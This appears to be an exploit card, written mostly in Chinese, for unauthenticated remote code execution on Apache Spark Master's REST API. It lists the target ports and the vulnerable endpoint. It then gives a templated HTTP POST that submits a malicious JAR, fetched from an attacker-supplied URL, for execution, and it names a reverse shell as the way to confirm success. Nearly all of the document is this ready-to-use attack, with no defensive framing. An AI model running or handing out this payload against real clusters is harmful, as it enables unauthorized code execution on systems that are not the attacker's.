# Apache Spark Unauthenticated RCE (unacc)

## 指纹特征
- 服务: Apache Spark Master
- 端口: 6066 (REST API), 7077 (Submission Gateway)

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| REST API 提交应用 | `/v1/submissions/create` | 无 |

## PoC 指令

通过 REST API 提交包含 JAR 资源的恶意应用任务：

```http
POST /v1/submissions/create HTTP/1.1
Host: {{TARGET}}:6066
Content-Type: application/json

{
  "action": "CreateSubmissionRequest",
  "appResource": "{{JAR_URL}}",
  "mainClass": "{{MAIN_CLASS}}",
  "sparkProperties": {
    "spark.jars": "{{JAR_URL}}",
    "spark.master": "spark://{{TARGET}}:7077"
  }
}
```

## Success Signal
- **状态验证**: 接口返回提交 ID。
- **物理验证**: 查看 Slave 节点日志或通过反弹 Shell 确认命令执行。
